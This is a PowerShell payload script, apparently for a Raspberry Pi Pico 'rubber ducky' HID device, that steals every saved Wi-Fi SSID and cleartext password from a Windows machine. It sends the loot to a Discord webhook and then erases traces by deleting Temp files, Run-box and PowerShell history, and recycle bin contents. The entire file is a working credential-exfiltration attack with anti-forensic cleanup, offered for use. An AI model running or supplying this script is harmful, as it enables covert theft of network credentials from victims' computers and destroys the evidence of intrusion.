################################################################
# Title        : Wifi profile stealer to discord               #
# Author       : JeffreyT72                                    #
# Version      : 2.0                                           #
# Category     : Credentials, Exfiltration                     #
# Target       : Windows 10                                    #
# Mode         : HID                                           #
################################################################

<#
.SYNOPSIS
	This script exfiltrates wifi credentials from the pc and send through Discord webhook.
    Work for Raspberry Pi Pico
.DESCRIPTION 
	Saves the wifi credentials from the pc, then connects to Discord and uploads
    the file containing all of the loot.
    * Remember to replace your discord webhook link to 'DISCORD WEBHOOK LINK HERE'
.Link
	https://github.com/dbisu/pico-ducky		                          # Guide for setting up your pico-ducky
    https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/tree/main   # Guide for general PowerShell-for-Hackers
#>

#Stage 1 Obtain the credentials from the pc
Function Get-Networks {
    # Get Network Interfaces
    $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

    # Get Wifi SSIDs and Passwords	
    $WLANProfileNames =@()

    #Get all the WLAN profile names
    $Output = netsh.exe wlan show profiles | Select-String -pattern " : "

    #Trim the output to receive only the name
    Foreach($WLANProfileName in $Output){
        $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
    }
    $WLANProfileObjects =@()

    #Bind the WLAN profile names and also the password to a custom object
    Foreach($WLANProfileName in $WLANProfileNames){
        #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
        try{
            $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
        }catch{
            $WLANProfilePassword = "The password is not stored in this profile"
        }
        #Build the object and add this to an array
        $WLANProfileObject = New-Object PSCustomobject 
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "SSID" -Value $WLANProfileName
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "Password" -Value $WLANProfilePassword
        $WLANProfileObjects += $WLANProfileObject
        Remove-Variable WLANProfileObject    
    }
    return $WLANProfileObjects
}
$Networks = Get-Networks | ConvertTo-Json
#Save them to a file in the temp folder.
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
echo $Networks >> $env:TMP\$FileName

#Stage 2 Discord message construct
$fileContent = Get-Content -Path $env:TMP\$FileName | Out-String
$Body = @{
    'username' = 'Wifi_Stealer'
    'content' = $fileContent
}

$ErrorBody = @{
    'username' = 'Wifi_Stealer'
    'content' = 'Target missing or disabled wifi adapter'
}

#Stage 3 Upload them to Discord
$WebhookUri = 'DISCORD WEBHOOK LINK HERE'
try {
    Invoke-RestMethod -Uri $WebhookUri -Method POST -Body ($Body | ConvertTo-Json) -ContentType 'application/json'
}catch {
    Invoke-RestMethod -Uri $WebhookUri -Method POST -Body ($ErrorBody | ConvertTo-Json) -ContentType 'application/json'
}

#Stage 4 Cleanup Traces
#This is to clean up behind you and remove any evidence to prove you were there
# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
$historyPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $historyPath) {
    Remove-Item $historyPath
}

$historyPath2 = Join-Path -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine -ChildPath 'ConsoleHost_history.txt'
if (Test-Path $historyPath2) {
    Remove-Item $historyPath2
}

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Clear the PowerShell command history
Clear-History

exit
